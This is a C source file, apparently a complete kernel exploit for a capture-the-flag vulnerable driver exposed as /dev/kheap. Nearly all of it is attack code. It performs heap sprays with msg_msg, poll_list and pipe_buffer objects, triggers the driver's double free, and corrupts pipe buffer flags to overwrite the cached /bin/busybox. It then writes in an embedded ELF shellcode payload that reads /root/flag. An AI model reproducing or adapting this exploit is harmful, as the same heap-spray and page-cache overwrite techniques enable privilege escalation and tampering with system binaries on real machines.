#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <ctype.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/sem.h>
#include <semaphore.h>
#include <poll.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/wait.h>
#include <sys/socket.h>

void err_exit(char *msg)
{
    printf("\033[31m\033[1m[x] Error at: \033[0m%s\n", msg);
    sleep(2);
    exit(EXIT_FAILURE);
}

void info(char *msg)
{
    printf("\033[35m\033[1m[+] %s\n\033[0m", msg);
}

void hexx(char *msg, size_t value)
{
    printf("\033[32m\033[1m[+] %s: \033[0m%#llx\n", msg, value);
}

void binary_dump(char *desc, void *addr, int len) {
    uint64_t *buf64 = (uint64_t *) addr;
    uint8_t *buf8 = (uint8_t *) addr;
    if (desc != NULL) {
        printf("\033[33m[*] %s:\n\033[0m", desc);
    }
    for (int i = 0; i < len / 8; i += 4) {
        printf("  %04x", i * 8);
        for (int j = 0; j < 4; j++) {
            i + j < len / 8 ? printf(" 0x%016lx", buf64[i + j]) : printf("                   ");
        }
        printf("   ");
        for (int j = 0; j < 32 && j + i * 8 < len; j++) {
            printf("%c", isprint(buf8[i * 8 + j]) ? buf8[i * 8 + j] : '.');
        }
        puts("");
    }
}

/* bind the process to specific core */
void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("\033[34m\033[1m[*] Process binded to core \033[0m%d\n", core);
}

// #define DEBUG 1
#ifdef DEBUG
#define debug(...) printf(__VA_ARGS__)
#else
#define debug(...) do {} while (0)
#endif

#define PAGE_SIZE 4096
#define N_STACK_PPS 30
#define POLLFD_PER_PAGE 510
#define POLL_LIST_SIZE 16

// size 为预分配的对象大小
#define NFDS(size) (((size - POLL_LIST_SIZE) / sizeof(struct pollfd)) + N_STACK_PPS);

pthread_t poll_tid[0x1000];
size_t poll_threads;
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
int fds[0x1000];
struct t_args
{
    int id;
    int nfds;
    int timer;
    int suspend;
};


struct poll_list
{
    struct poll_list *next;
    int len;
    struct pollfd entries[];
};

int randint(int min, int max)
{
    return min + (rand() % (max - min));
}


void assign_thread_to_core(int core_id)
{
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (pthread_setaffinity_np(pthread_self(), sizeof(mask), &mask) < 0)
    {
        perror("[X] assign_thread_to_core_range()");
        exit(1);
    }
}

void init_fd(int i)
{
    fds[i] = open("/etc/passwd", O_RDONLY);

    if (fds[i] < 1)
    {
        perror("[X] init_fd()");
        exit(1);
    }
}

void *alloc_poll_list(void *args)
{
    struct pollfd *pfds;
    int nfds, timer, id;
    int suspend;

    id    = ((struct t_args *)args)->id;
    nfds  = ((struct t_args *)args)->nfds;
    timer = ((struct t_args *)args)->timer;
    suspend = ((struct t_args *)args)->suspend;

    pfds = calloc(nfds, sizeof(struct pollfd));

    for (int i = 0; i < nfds; i++)
    {
        pfds[i].fd = fds[0];
        pfds[i].events = POLLERR;
    }

    assign_thread_to_core(0);

    pthread_mutex_lock(&mutex);
    poll_threads++;
    pthread_mutex_unlock(&mutex);

    debug("[Thread %d] Start polling...\n", id);
    int ret = poll(pfds, nfds, timer);
    debug("[Thread %d] Polling complete: %d!\n", id, ret);

    assign_thread_to_core(randint(1, 3));

    if (suspend)
    {
        debug("[Thread %d] Suspending thread...\n", id);

        pthread_mutex_lock(&mutex);
        poll_threads--;
        pthread_mutex_unlock(&mutex);

        while (1) { };
    }

}

void create_poll_thread(int id, size_t size, int timer, int suspend)
{
    struct t_args *args;

    args = calloc(1, sizeof(struct t_args));

    if (size > PAGE_SIZE)
        size = size - ((size/PAGE_SIZE) * sizeof(struct poll_list));

    args->id = id;
    args->nfds = NFDS(size);
    args->timer = timer;
    args->suspend = suspend;

    pthread_create(&poll_tid[id], 0, alloc_poll_list, (void *)args);
}


void join_poll_threads(void)
{
    for (int i = 0; i < poll_threads; i++)
    {
        pthread_join(poll_tid[i], NULL);
    }

    poll_threads = 0;
}

struct msg_buf {
	long m_type;
	char m_text[1];
};

struct msg_header {
	void *l_next;
	void *l_prev;
	long m_type;
	size_t m_ts;		
	void *next;
	void *security;
};

int fd;

void add() {
	if (ioctl(fd, 0xdead, NULL)) err_exit("add()");
}

void dele() {
	if (ioctl(fd, 0xbeef, NULL)) err_exit("dele()");
}

#define SPRAY_KEYS 0x200
#define SPRAY_POLL (42*13)
#define SPRAY_MSG  (SPRAY_POLL*20)
#define ADD_NUM (42*4+20)
#define SPRAY_MSG_DF 0x60
#define SPRAY_PIPE 0x1f0
#define SPRAY_PIPE_DF 0xf0
#define USE_SZ 192
#define VULN_SZ 96

#define ATTACK_FILE "/bin/busybox"

int key_len = 0;
int key_id[SPRAY_KEYS];

int msg_len = 0;
int msg_df_len = 0;
int msg_id[SPRAY_MSG];
int msg_df_id[SPRAY_MSG_DF];
int orig_msg_idx;
int victim_msg_id;

int pipe_fd[SPRAY_PIPE][2];
int file_fd[SPRAY_PIPE];

void pwn() {
	
	char buffer[4096] = { 0 };
	char msg_buffer[4096] = { 0 };
	struct msg_buf* msg_buf = (struct msg_buf*)msg_buffer;
	int res;

	fd = open("/dev/kheap", O_RDWR);
	if (fd < 0) err_exit("open() for /dev/kheap");
                        
	for (int i = 0; i < 1; i++) {
		if ((file_fd[i] = open(ATTACK_FILE, O_RDONLY)) < 0) err_exit("open()");
	}

	for (int i = 0; i < SPRAY_PIPE; i++) {
		if (pipe(pipe_fd[i]) < 0) err_exit("pipe()");
	}
	
	info("Spraying msg_msg from kmalloc-cg-192 | order = 0 [GFP_KERNEL_ACCOUNT]");
	msg_buf->m_type = 1;
	memset(msg_buf->m_text, 'A', USE_SZ);
	for (int i = 0; i < SPRAY_MSG_DF; i++, msg_df_len++) {
		if ((msg_df_id[i] = msgget(IPC_PRIVATE, 0666|IPC_CREAT)) < 0) {
			perror("msgget");
			break;
		}
		*(uint64_t*)(msg_buf->m_text) = i;
		if (msgsnd(msg_df_id[i], msg_buf, USE_SZ-0x30, 0) < 0) err_exit("msgsnd()");
	}
	hexx("msg_df_len", msg_df_len);

	info("Spraying poll_list from kmalloc-96 | order = 0 [GFP_KERNEL]");
	init_fd(0);
	for (int i = 0; i < SPRAY_POLL; i++) {
		if (i == ADD_NUM) add();
		create_poll_thread(i, VULN_SZ-8, 4000, 0);
	}

	while (poll_threads != SPRAY_POLL) {}
	join_poll_threads();
	dele();
	sleep(2);

	info("Spraying msg_msg from kmalloc-cg-192 | order = 0 [GFP_KERNEL_ACCOUNT]");
	msg_buf->m_type = 1;
	memset(msg_buf->m_text, 'A', USE_SZ);
	for (int i = 0; i < SPRAY_MSG; i++, msg_len++) {
		if ((msg_id[i] = msgget(IPC_PRIVATE, 0666|IPC_CREAT)) < 0) {
			perror("msgget");
			break;
		}
		*(uint64_t*)(msg_buf->m_text) = i;
		if (msgsnd(msg_id[i], msg_buf, USE_SZ-0x30, 0) < 0) err_exit("msgsnd()");
	}
	hexx("msg_len", msg_len);
//	puts("[S] Debug 1");
//	getchar();

	info("Freeing some objects to kmalloc-cg-192 | order = 0");
	for (int i = 0; i < ((2*msg_df_len)/3); i++) {
		if (i == msg_df_len / 3) dele();
		if (msgrcv(msg_df_id[i], msg_buf, USE_SZ-0x30, 1, 0) < 0) err_exit("msgrcv");
	}


	info("Spraying pipe_buffer from kmalloc-cg-192 | order = 0 [GFP_KERNEL_ACCOUNT]");
//	dele();	
	for (int i = 0; i < SPRAY_PIPE; i++) {
		if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 0x1000*4) < 0)
			perror("fcntl()"), err_exit("fcntl()");
	}

	info("Splice ATTACK FILE");
	for (int i = 0; i < SPRAY_PIPE; i++) {
		loff_t offset = i;
		if (splice(file_fd[0], &offset, pipe_fd[i][1], NULL, 1, 0) <= 0)
			perror("[X] splice"), exit(EXIT_FAILURE);
	}
	
//	puts("[S] DEBUG");
//	getchar();
	
	info("Checking Hit");
	orig_msg_idx = -1;
	for (int i = 0; i < SPRAY_MSG && orig_msg_idx == -1; i++) {
		memset(msg_buffer, 0, sizeof(msg_buffer));
		if (msgrcv(msg_id[i], msg_buf, USE_SZ-0x30, 0, MSG_COPY|IPC_NOWAIT) < 0) perror("msgrcv");
		for (int i = 0; i < ((USE_SZ-0x30)/8); i++) {
			uint64_t val = *(uint64_t*)(msg_buf->m_text+i*8);
			if (val > 0xffffffff81000000ULL && (val&0xfff) == 0xa80) {
				orig_msg_idx = *(uint64_t*)(msg_buf->m_text);
				binary_dump("DATA", msg_buf->m_text, USE_SZ-0x30);
				*(uint64_t*)(msg_buf->m_text+i*8-8) = 0x1;
				*(unsigned int*)(msg_buf->m_text+i*8+8) = 0x10;
				memcpy(buffer, msg_buffer, sizeof(buffer));
				break;
			}
		}
	}

	if (orig_msg_idx == -1) err_exit("Not Hit");
	hexx("orig_msg_idx", orig_msg_idx);

	info("Freeing some objects to kmalloc-cg-192 | order = 0");
	for (int i = ((2*msg_df_len)/3); i < msg_df_len; i++) {
		if (i == ((5*msg_df_len)/6)) {
			if ((res = msgrcv(msg_id[orig_msg_idx], msg_buf, USE_SZ-0x30, 1, 0)) < 0)
				err_exit("msgrcv");
			hexx("msgrcv len", res);
		}
		if (msgrcv(msg_df_id[i], msg_buf, USE_SZ-0x30, 1, 0) < 0) err_exit("msgrcv");
	}
	
	
	info("Spraying msg_msg from kmalloc-cg-192 | order = 0 [GFP_KERNEL_ACCOUNT]");
	memcpy(msg_buffer, buffer, sizeof(buffer));
	*(uint64_t*)(msg_buf->m_text) = 0xdeadbeef;	
	msg_buf->m_type = 1;
	msg_df_len = 0;
	binary_dump("DATA", msg_buf->m_text, USE_SZ-0x30);
	for (int i = 0; i < SPRAY_MSG_DF; i++, msg_df_len++) {
		if ((msg_df_id[i] = msgget(IPC_PRIVATE, 0666|IPC_CREAT)) < 0) {
			perror("msgget");
			break;
		}
		if (msgsnd(msg_df_id[i], msg_buf, USE_SZ-0x30, 0) < 0) err_exit("msgsnd()");
	}
	hexx("msg_df_len", msg_df_len);

	unsigned char elfcode[] = {
            /*0x7f,*/ 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
                0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x68, 0x60, 0x66, 0x01, 0x01, 0x81, 0x34, 0x24, 0x01, 0x01, 0x01, 0x01,
                0x48, 0xb8, 0x2f, 0x72, 0x6f, 0x6f, 0x74, 0x2f, 0x66, 0x6c, 0x50, 0x6a,
                0x02, 0x58, 0x48, 0x89, 0xe7, 0x31, 0xf6, 0x0f, 0x05, 0x41, 0xba, 0xff,
                0xff, 0xff, 0x7f, 0x48, 0x89, 0xc6, 0x6a, 0x28, 0x58, 0x6a, 0x01, 0x5f,
                0x99, 0x0f, 0x05, 0xEB
        };

	for (int i = 0; i < SPRAY_PIPE; i++) {
		write(pipe_fd[i][1], elfcode, sizeof(elfcode));
	}

//	puts("[S] Debug 1");
//	getchar();
	puts("EXP NERVER END!");
}

int main(int argc, char** argv, char** envp) {

	bind_core(0);
	pwn();

	return 0;
}
